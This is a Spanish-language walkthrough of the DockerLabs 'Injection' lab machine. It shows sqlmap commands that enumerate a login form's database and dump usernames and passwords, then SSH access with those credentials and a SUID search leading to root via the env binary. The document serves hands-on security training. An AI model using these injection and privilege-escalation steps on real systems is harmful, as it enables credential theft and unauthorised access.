---
title: Injection - DockerLabs
published: true
categories: DockerLabs
---


| OS     | Dificultad  | Creator           |
| ------ | ----------- | -------------     | 
| Linux  |  Muy Fàcil  | ElPinguinoDeMario | 

## Reconocimiento

Vemos el puerto 22 y el puerto 80.

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/34d69cbb-28db-40f4-9ecf-dc59dcf898e4)

Vamos a ver el puerto 80.

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/5c2f251b-9d7a-4225-a983-bce7c58b4705)

Tenemos un panel de login.

Vamos a hacer fuzzing con Gobuster.

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/0d977f1f-8f69-46ef-8d68-6be2ea6bed36)

Vemos el directorio `/config.php`, pero no hay nada, está en blanco.

Si hacemos varios intentos de contraseña, vemos este error.

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/d1b820d1-fc58-46d1-b073-c544605072cb)

Vamos a probar una inyección SQL.

```
sqlmap -u http://172.17.0.2/index.php --forms --dbs --batch
```
Nos muestra lo siguiente:

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/a33442e1-ee83-4d65-8b42-ca8ceaa09091)


Ahora usamos el siguiente comando para acceder a register:

```
sqlmap -u http://172.17.0.2/index.php --forms -D register --tables --batch
```

Accedemos a users y listamos las columnas:

```
sqlmap -u http://172.17.0.2/index.php --forms -D register -T users --columns --batch
```
![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/1443641b-e783-4363-9c2c-1100470f1ade)


Por último, listamos las dos columnas que hay: passwd y usernames, y tenemos credenciales.

```
sqlmap -u http://172.17.0.2/index.php --forms -D register -T users -C passwd,usernames --dump --batch
```
![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/bad6f6df-eb63-4e69-8ca4-421e5619508d)

Ahora, si accedemos a la web, nos dice lo siguiente:

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/785b3b3e-013f-4b11-b283-b5a0104c1fc8)


Vamos a ver si las credenciales son válidas para SSH.

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/0a9bee3a-7ba9-4324-99ad-8f3b41928669)


Las credenciales son válidas para el SSH. Vamos a ver cómo escalamos privilegios.

Si hacemos una búsqueda de permisos SUID con el comando:

```
find / -perm -4000 2>/dev/null
```

Encontramos el binario env.

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/3c73b313-4345-4972-af26-428f114224a9)

Vamos a explotarlo haciendo una búsqueda en GTFOBins.

![imagen](https://github.com/romabri/romabri.github.io/assets/51706860/ff528a3e-7d11-4e4f-9a13-27d208224364)

¡YA SOMOS ROOT!
